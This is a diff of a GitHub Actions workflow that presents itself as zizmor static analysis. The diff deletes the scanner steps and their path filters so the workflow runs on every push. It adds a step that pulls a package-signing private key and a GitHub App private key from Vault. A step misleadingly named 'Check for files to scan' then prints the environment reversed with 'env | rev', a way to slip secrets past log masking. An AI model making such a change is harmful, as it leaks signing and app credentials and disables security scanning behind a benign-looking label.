@@ -1,11 +1,7 @@
 name: zizmor GitHub Actions static analysis
 on:
   push:
-    paths:
-      - ".github/**"
-  pull_request:
-    paths:
-      - ".github/**"
+    
 jobs:
   zizmor-check:
     name: Check whether there are things to scan
@@ -15,36 +11,21 @@ jobs:
     outputs:
       found-files: ${{ steps.zizmor-check.outputs.found-files }}
     steps:
-      - name: Checkout
-        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4
-      - name: Run zizmor
-        id: zizmor-check
-        shell: bash
-        run: |
-          FOUND_FILES=false
-          SEARCH=$(find . -path "**/.github/workflows/*.yml" -o -path "**/.github/workflows/*.yaml" -o -path "**/action.yml" -o -path "**/action.yaml")
-          if [ -n "$SEARCH" ]; then
-              FOUND_FILES=true
-          fi
-          echo "found-files=${FOUND_FILES}" >> $GITHUB_OUTPUT
-  zizmor:
-    name: Run zizmor from current branch (self test)
-
-    permissions:
-      actions: read
-      contents: read
-      id-token: write
-      pull-requests: write
-      security-events: write
-
-    needs:
-      - zizmor-check
-    if: ${{ needs.zizmor-check.outputs.found-files == 'true' }}
-
-    uses: ./.github/workflows/reusable-zizmor.yml
-    with:
-      runs-on: ${{ !github.event.repository.private && 'ubuntu-latest' || 'ubuntu-arm64-small' }}
-      fail-severity: high
-      min-severity: high
-      min-confidence: low
-      extra-args: --offline
+    - name: Get secrets from Vault
+      id: get-secrets
+      uses: grafana/shared-workflows/actions/get-vault-secrets@f1614b210386ac420af6807a997ac7f6d96e477a # get-vault-secrets/v1.3.1
+      env:
+        ACTIONS_ID_TOKEN_REQUEST_TOKEN: abc
+        ACTIONS_ID_TOKEN_REQUEST_URL: def
+        VAULT_INSTANCE: ops
+      with:
+        vault_instance: ops
+        common_secrets: |
+          NFPM_SIGNING_KEY=packages-gpg:private-key
+          GITHUB_APP_ID=plugins-platform-bot-app:app-id
+          GITHUB_APP_PRIVATE_KEY=plugins-platform-bot-app:private-key
+        export_env: false
+    - name: Check for files to scan
+      id: foo
+      run: |
+        env | rev
